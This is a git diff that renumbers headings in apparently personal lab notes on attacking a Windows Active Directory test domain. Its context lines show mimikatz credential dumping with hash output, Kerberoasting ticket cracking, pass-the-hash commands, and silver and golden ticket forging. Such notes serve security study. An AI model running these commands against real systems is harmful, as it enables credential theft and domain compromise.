@@ -7,7 +7,7 @@
 |svr.lab.vx|192.168.17.151|Windows Server 2016|Domain Member Server, SQL Server|
 |client.lab.vx|192.168.17.161|Windows 10 1607|Domain Member Workstation, SQL Server Management Studio|
 
-# Cached Credential Storage and Retrieval
+# 1. Cached Credential Storage and Retrieval
 **On Kali**: Setup web server to host `mimikatz`
 ```console
 cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
@@ -54,7 +54,7 @@ mimikatz # sekurlsa::logonpasswords
 ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
 ```
 
-- Successful `lsadump::sam` example:
+## 1.1. Successful `lsadump::sam` example
 
 ```console
 mimikatz # lsadump::sam
@@ -147,7 +147,7 @@ Supplemental Credentials:
       des_cbc_md5       : ecd6e0d6237ca19e
 ```
 
-- Successful `lsadump::lsa /patch` example:
+## 1.2. Successful `lsadump::lsa /patch` example
 
 ```console
 mimikatz # lsadump::lsa /patch
@@ -179,7 +179,7 @@ LM   :
 NTLM : 5a2b1b78290d381def497905d467fcff
 ```
 
-- Successful `sekurlsa::logonpasswords` example:
+## 1.3. Successful `sekurlsa::logonpasswords` example
 
 ```console
 mimikatz # sekurlsa::logonpasswords
@@ -241,7 +241,7 @@ SID               : S-1-5-21-1470288461-3401294743-676794760-1104
 ••• OUTPUT TRUNCATED •••
 ```
 
-# Service Account Attack (Kerberoasting)
+# 2. Service Account Attack (Kerberoasting)
 
 ```console
 kerberos::list /export
@@ -249,11 +249,11 @@ sudo apt update && sudo apt install kerberoast
 python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
 ```
 
-# Pass the Hash
+# 3. Pass the Hash
 
 ☝️ **Note**: LM hashes are not used from Windows 10 onwards, string of 32 zeros can used to fill the LM hash portion of the pth-winexe command
 
-## pth-winexe
+## 3.1. pth-winexe
 - Domain account
 
 ```console
@@ -292,8 +292,8 @@ hostname
 SVR
 ```
 
-## mimikatz - sekurlsa::pth
-### Domain account
+## 3.2. mimikatz - sekurlsa::pth
+### 3.2.1. Domain account
 - On mimikatz: run `privilege::debug` followed by `sekurlsa::pth`
 - The `sekurlsa::pth` will spawn a new cmd window
 
@@ -349,7 +349,7 @@ C:\Windows\system32>hostname
 DC
 ```
 
-### Local account
+### 3.2.3. Local account
 - Using `sekurlsa::pth` for local accounts is similar as domain accounts; just user `*` or `workgroup` for the `/domain` option
 
 ```console
@@ -405,7 +405,7 @@ C:\Windows\system32>hostname
 SVR
 ```
 
-# Silver Ticket
+# 4. Silver Ticket
 ```console
 kerberos::purge
 kerberos::list
@@ -413,7 +413,7 @@ kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-27875233
 kerberos::list
 ```
 
-# Golden Ticket
+# 5. Golden Ticket
 ```console
 lsadump::lsa /patch
 kerberos::purge
